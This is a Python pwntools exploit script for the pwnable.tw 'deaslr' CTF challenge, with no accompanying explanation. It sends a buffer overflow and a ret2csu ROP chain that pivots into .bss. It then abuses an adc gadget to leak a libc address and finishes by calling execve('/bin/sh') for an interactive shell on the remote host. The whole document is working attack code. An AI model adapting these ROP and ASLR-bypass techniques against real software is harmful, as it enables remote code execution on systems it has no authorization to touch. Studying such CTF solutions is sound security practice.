#!/usr/bin/env python
# coding=utf8

from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

EXECUTABLE = './deaslr'
PROG = ELF(EXECUTABLE)

#cn = process(EXECUTABLE, env={'LD_PRELOAD':'./libc_64.so.6'})
libc=ELF('./libc_64.so.6')
cn = remote('chall.pwnable.tw', 10402)
elf = ELF(EXECUTABLE)


# Wait for debugger
#pid = util.proc.pidof(cn)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)

bss_start       = 0x00601100
part1           = 0x004005ba    # pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15
part2           = 0x004005a0    # mov rdx,r13; mov rsi,r14; mov edi,r15d;call [r12 + rbx*8]
void            = 0xdeadbeefdeadbeef
poprbp          = 0x004004e8
leave_ret       = 0x00400554
adc             = 0x004004f8    #adc dword [rbp + 0x48], edx;mov ebp, esp;call sym.deregister_tm_clones;pop rbp;mov byte [obj.completed.7568], 1 ; obj.__TMC_END ; [0x601010:1]=
ret             = 0x004005c4
addrsp8         = 0x004005d8
start           = 0x0040053e
write_offset    = 0x000879ec
libc_leak       = 0x006014c0 
def call_function(call_addr, arg3, arg2, arg1):
    payload=""
    payload += p64(part1)
    payload += p64(0)           # RBX
    payload += p64(1)           # RBP   
    payload += p64(call_addr)   # R12 -> RIP
    payload += p64(arg1)        # R13 -> RDX
    payload += p64(arg2)        # R14 -> RSI
    payload += p64(arg3)        # R15 -> RDI
    payload += p64(part2)
    payload += p64(void)*7      # stack adjust
    return payload

def printsc(payload):
    for character in payload:
        sys.stdout.write(character.encode('hex'))
    

# stack
payload  = "A"*24
payload += call_function(elf.got["gets"],bss_start,void,void) 
payload += p64(poprbp)
payload += p64(bss_start)
payload += p64(leave_ret)


raw_input()
printsc(payload)
cn.sendline(payload)

#this in bss
payload2 = p64(ret)
payload2 += (p64(addrsp8)+p64(0))*0x40# add rsp+8 
payload2 += call_function(elf.got["gets"],bss_start-0x50,void,void) 
payload2 += call_function(bss_start,void,void,write_offset) 
payload2 += p64(poprbp)
payload2 += p64(libc_leak-0x48)
payload2 += p64(adc) #libc_leak should be puts() function now
payload2 += p64(0x3333333333333333) 
payload2 += call_function(libc_leak,1,bss_start+0x3e8,0x08) 
payload2 += call_function(elf.got["gets"],bss_start,void,void)
payload2 += p64(ret)
payload2 += p64(poprbp)
payload2 += p64(bss_start)
payload2 += p64(leave_ret)

raw_input()
print("second stage")
printsc(payload2)
cn.sendline(payload2)# leak libc in bss 


raw_input()
cn.sendline("a")



leak_address = u64(cn.recv(8))
print hex(leak_address)
libc.address = leak_address - 0x3c38e0 # offset to libc_main

payload3 = "/bin/sh\x00" 
payload3 += call_function(bss_start+0x8*15+0x08,bss_start,bss_start+0x08*15+0x08*2,0x00) 
payload3 += p64(libc.symbols["execve"])
payload3 += p64(bss_start) 
payload3 += p64(0x0)

raw_input()
cn.sendline(payload3)


cn.interactive()


